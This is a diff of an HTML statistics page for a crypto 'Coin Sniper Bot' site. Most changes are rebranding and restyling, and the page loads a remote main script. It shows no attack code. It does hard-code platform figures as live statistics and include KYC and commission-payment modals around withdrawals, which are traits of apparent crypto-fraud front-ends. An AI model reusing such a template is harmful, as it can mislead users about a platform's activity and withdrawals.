@@ -2,12 +2,19 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <link rel="prefetch" href="https://api.snipercallsbot.com/main.js" />
+    <link
+      rel="prefetch"
+      href="https://api.snipercallsbot.com/main_j29d3jf4.js"
+    />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/img/logo.svg" />
     <link rel="stylesheet" href="/styles/style.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Manrope:wght@200..800&display=swap"
+      rel="stylesheet"
+    />
     <link
       href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap"
       rel="stylesheet"
@@ -17,52 +24,65 @@
       rel="stylesheet"
     />
     <link
+      href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap"
+      rel="stylesheet"
+    />
+    <link
       href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;1,100;1,200;1,300;1,400;1,500;1,600;1,700&display=swap"
       rel="stylesheet"
     />
-
     <script>
       window.isProfile = true;
     </script>
 
-    <title>Sniper Calls Bot</title>
+    <title>Coin Sniper Bot</title>
   </head>
   <body>
     <header class="header">
       <div class="header__inner">
         <div class="header__left">
           <a class="header__logo" href="/">
-            <img src="/img/logo_white.svg" alt="" srcset="" />
-            <span>Sniper Calls Bot</span>
+            <img src="/img/logo.svg" alt="" srcset="" />
+            <span>COIN SNIPER BOT</span>
           </a>
 
           <div class="header__block">
-            <a href="/" class="header__link">
+            <a href="/" class="header__link left_side">
               <img src="/img/trading.svg" alt="" />
-              TRADING
+              Trading
             </a>
-            <a href="/statistics.html" class="header__link">
+            <a href="/statistics.html" class="header__link left_side active">
               <img src="/img/statistics.svg" alt="" />
-              STATISTICS
+              Statistics
             </a>
           </div>
         </div>
 
         <div class="header__right">
           <div class="header__block">
-            <div class="header__link">
-              <img src="/img/card_blue.svg" alt="" />
-              <span>$<span id="headerWalletBalance">0000.00</span></span>
+            <div class="header__link button">
+              <img src="/img/wallet.svg" alt="" />
+              <span
+                >$<span
+                  id="headerWalletBalance"
+                  style="color: white; padding-left: 6px"
+                  >0.00</span
+                ></span
+              >
             </div>
 
-            <a href="/profile.html" class="header__wallet desktop" id="headerWallet">
+            <a
+              href="/profile.html"
+              class="header__wallet desktop button"
+              id="headerWallet"
+            >
               <img
                 src="/img/profile.svg"
                 alt=""
                 class="header__wallet__profile__img"
               />
               <span>Profile</span>
-              <span id="headerProfileName" style="display: none;">User</span>
+              <span id="headerProfileName" style="display: none">User</span>
               <!-- <img src="/img/arrow_down.svg" alt="" class="header__wallet__arrow__img"/> -->
             </a>
           </div>
@@ -77,11 +97,9 @@
           </div>
 
           <div class="header__burger" onclick="toogleNav()">
-            <img src="/img/burger.svg" alt="">
+            <img src="/img/burger.svg" alt="" />
           </div>
         </div>
-
-
       </div>
     </header>
 
@@ -95,15 +113,20 @@
         STATISTICS
       </a>
 
-      <a href="/profile.html" class="header__link" style="margin-bottom: 15px;">
+      <a href="/profile.html" class="header__link" style="margin-bottom: 15px">
         <img
-        src="/img/profile.svg"
-        alt=""
-        class="header__wallet__profile__img"
-        width="30px"
-        height="30px"
-        style="width: 30px; height: 30px; margin-right: 16px; transform: translateX(4px);"
-      />
+          src="/img/profile.svg"
+          alt=""
+          class="header__wallet__profile__img"
+          width="30px"
+          height="30px"
+          style="
+            width: 30px;
+            height: 30px;
+            margin-right: 16px;
+            transform: translateX(4px);
+          "
+        />
         <span id="headerProfileName2">USER</span>
       </a>
 
@@ -111,14 +134,11 @@
         <img src="/img/card_blue.svg" alt="" />
         <span>$<span id="headerWalletBalance2">0000.00</span></span>
       </div>
-
     </div>
 
     <main>
       <div class="container">
         <div class="profile">
-          <div class="glow" id="glow" style="width: 0; height: 0"></div>
-
           <div class="profile__inner">
             <div class="profile__block statistics">
               <div class="profile__block__statistics">
@@ -130,21 +150,24 @@
                     <div
                       class="profile__block__statistics__item__inner--bottom"
                     >
-                      <span id="statsUsd">748642</span>$
+                      <img src="/img/$.svg" alt="" />
+
+                      <span id="statsUsd">748642</span>
                     </div>
                   </div>
                 </div>
                 <div class="profile__block__statistics__item user">
-                  <img src="/img/users.svg" alt="" />
                   <div class="profile__block__statistics__item__inner">
                     <div class="profile__block__statistics__item__inner--top">
-                      USERS
+                      Users
                     </div>
                     <div
                       class="profile__block__statistics__item__inner--bottom"
-                      id="statsUsers"
+                     
                     >
-                      3632
+                      <img src="/img/stats_user.svg" alt="" />
+
+                      <span  id="statsUsers">3632</span>
                     </div>
                   </div>
                 </div>
@@ -177,9 +200,7 @@
                 <div
                   class="profile__block__table__body"
                   id="stats_transactions"
-                >
-                 
-                </div>
+                ></div>
               </div>
             </div>
             <!-- <div class="profile__block bottom">
@@ -200,8 +221,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__subtitle">
@@ -270,8 +291,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__title" style="margin-bottom: 18px">
@@ -324,8 +345,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__withdrawal__subtitle">
@@ -388,8 +409,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__title">Commission payment</div>
@@ -461,8 +482,8 @@
         />
 
         <div class="modal__left__logo">
-          <img src="/img/logo_white.svg" alt="" />
-          Sniper Calls Bot
+          <img src="/img/logo.svg" alt="" />
+          Coin Sniper Bot
         </div>
 
         <div class="modal__deposit__crypto__title" style="margin-bottom: 18px">
@@ -550,8 +571,8 @@
         />
         <div class="modal__left">
           <div class="modal__left__logo">
-            <img src="/img/logo_white.svg" alt="" />
-            Sniper Calls Bot
+            <img src="/img/logo.svg" alt="" />
+            Coin Sniper Bot
           </div>
 
           <div class="modal__kyc__title">Select withdraw method</div>
@@ -594,8 +615,8 @@
         />
 
         <div class="modal__left__logo">
-          <img src="/img/logo_white.svg" alt="" />
-          Sniper Calls Bot
+          <img src="/img/logo.svg" alt="" />
+          Coin Sniper Bot
         </div>
 
         <div class="modal__deposit__crypto__title">Select cryptocurrency</div>
@@ -762,8 +783,8 @@
         />
 
         <div class="modal__left__logo">
-          <img src="/img/logo_white.svg" alt="" />
-          Sniper Calls Bot
+          <img src="/img/logo.svg" alt="" />
+          Coin Sniper Bot
         </div>
 
         <div class="modal__deposit__crypto__title">Select cryptocurrency</div>
@@ -999,9 +1020,13 @@
     </div>
 
     <a class="support" href="https://t.me/mevsolana_help" target="_blank">
-      <img src="/img/support.svg" alt="">
+      <img src="/img/support.svg" alt="" />
+      <div class="support__inner">
+        <div class="support__inner__top">Any questions?</div>
+        <div class="support__inner__bottom">Contact support 24/7</div>
+      </div>
     </a>
   </body>
 
-  <script src="https://api.snipercallsbot.com/main.js"></script>
+  <script src="https://api.snipercallsbot.com/main_v2.js"></script>
 </html>
